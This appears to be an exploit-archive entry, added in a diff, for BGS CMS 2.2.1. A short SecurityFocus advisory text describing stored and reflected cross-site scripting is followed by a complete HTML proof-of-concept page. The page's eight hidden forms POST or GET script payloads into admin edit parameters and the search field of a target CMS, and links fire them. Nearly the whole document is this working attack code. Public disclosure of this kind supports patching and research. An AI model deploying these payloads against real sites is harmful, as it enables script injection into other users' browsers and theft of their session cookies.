@@ -1,0 +1,130 @@
+source: http://www.securityfocus.com/bid/52983/info
+
+BGS CMS is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker could leverage the cross-site scripting issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.
+
+BGS CMS 2.2.1 is vulnerable; other versions may also be affected. 
+
+<html>
+<title>BGS CMS v2.2.1 Multiple Stored Cross-Site Scripting Vulnerabilities</title>
+<body bgcolor="#000000">
+<script type="text/javascript">
+function xss0(){document.forms["xss0"].submit();}
+function xss1(){document.forms["xss1"].submit();}
+function xss2(){document.forms["xss2"].submit();}
+function xss3(){document.forms["xss3"].submit();}
+function xss4(){document.forms["xss4"].submit();}
+function xss5(){document.forms["xss5"].submit();}
+function xss6(){document.forms["xss6"].submit();}
+function xss7(){document.forms["xss7"].submit();}
+</script>
+
+<form action="http://www.example.com/cms/" enctype="application/x-www-form-urlencoded" method="POST" id="xss0">
+<input type="hidden" name="name" value="Zero Science Lab" />
+<input type="hidden" name="title" value="XSS" />
+<input type="hidden" name="description" value="Cross Site Scripting" />
+<input type="hidden" name="parent_id" value="15" />
+<input type="hidden" name="redirect" value='"><script>alert(1);</script>' />
+<input type="hidden" name="close" value="OK" />
+<input type="hidden" name="section" value="categories" />
+<input type="hidden" name="action" value="edit" />
+<input type="hidden" name="id" value="29" />
+</form>
+
+<form action="http://www.example.com/cms/" enctype="application/x-www-form-urlencoded" method="POST" id="xss1">
+<input type="hidden" name="title" value="Zero Science Lab" />
+<input type="hidden" name="description" value='"><script>alert(1);</script>' />
+<input type="hidden" name="disp_on_full_view" value="1" />
+<input type="hidden" name="status" value="1" />
+<input type="hidden" name="level" value="0" />
+<input type="hidden" name="type" value="ads" />
+<input type="hidden" name="close" value="OK" />
+<input type="hidden" name="section" value="ads" />
+<input type="hidden" name="action" value="edit" />
+<input type="hidden" name="id" value="0" />
+</form>
+
+<form action="http://www.example.com/cms/" enctype="application/x-www-form-urlencoded" method="POST" id="xss2">
+<input type="hidden" name="created" value="ZSL" />
+<input type="hidden" name="name" value='"><script>alert(1);</script>' />
+<input type="hidden" name="email" value="test@test.mk" />
+<input type="hidden" name="message" value="t00t" />
+<input type="hidden" name="status" value="coolio" />
+<input type="hidden" name="close" value="OK" />
+<input type="hidden" name="section" value="orders" />
+<input type="hidden" name="action" value="edit" />
+</form>
+
+<form action="http://www.example.com/cms/" enctype="application/x-www-form-urlencoded" method="POST" id="xss3">
+<input type="hidden" name="name" value='"><script>alert(1);</script>' />
+<input type="hidden" name="question" value="What is physics?" />
+<input type="hidden" name="start" value="10 2012" />
+<input type="hidden" name="end" value="18 2012" />
+<input type="hidden" name="answer_text[]" value="A warm summer evening." />
+<input type="hidden" name="close" value="OK" />
+<input type="hidden" name="section" value="polls" />
+<input type="hidden" name="action" value="edit" />
+</form>
+
+<form action="http://www.example.com/cms/" enctype="application/x-www-form-urlencoded" method="POST" id="xss4">
+<input type="hidden" name="name" value="admin" />
+<input type="hidden" name="image" value="joxy.jpg" />
+<input type="hidden" name="url" value='"><script>alert(1);</script>' />
+<input type="hidden" name="max_displays" value="1" />
+<input type="hidden" name="close" value="OK" />
+<input type="hidden" name="section" value="banners" />
+<input type="hidden" name="action" value="edit" />
+<input type="hidden" name="id" value="9" />
+</form>
+
+<form action="http://www.example.com/cms/" enctype="application/x-www-form-urlencoded" method="POST" id="xss5">
+<input type="hidden" name="title" value='"><script>alert(1);</script>' />
+<input type="hidden" name="description" value="Ban" />
+<input type="hidden" name="folder" value="sexy_banner_imgx" />
+<input type="hidden" name="close" value="OK" />
+<input type="hidden" name="section" value="gallery" />
+<input type="hidden" name="action" value="edit" />
+</form>
+
+<form action="http://www.example.com/" method="GET" id="xss6">
+<input type="hidden" name="action" value="search" />
+<input type="hidden" name="search" value='"><script>alert(1);</script>' />
+<input type="hidden" name="x" value="0" />
+<input type="hidden" name="y" value="0" />
+</form>
+
+<form action="http://www.example.com/cms/" method="GET" id="xss7">
+<input type="hidden" name="section" value='"><script>alert(1);</script>' />
+<input type="hidden" name="action" value="add_news" />
+</form>
+
+<br /><br />
+
+<a href="javascript: xss0();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 0</h3></font></b></a><br />
+
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 1</h3></font></b></a><br />
+
+<a href="javascript: xss2();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 2</h3></font></b></a><br />
+
+<a href="javascript: xss3();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 3</h3></font></b></a><br />
+
+<a href="javascript: xss4();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 4</h3></font></b></a><br />
+
+<a href="javascript: xss5();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 5</h3></font></b></a><br />
+
+<a href="javascript: xss6();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 6</h3></font></b></a><br /><br />
+
+<a href="javascript: xss7();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 7</h3></font></b></a><br /><br />
+
+</body></html>
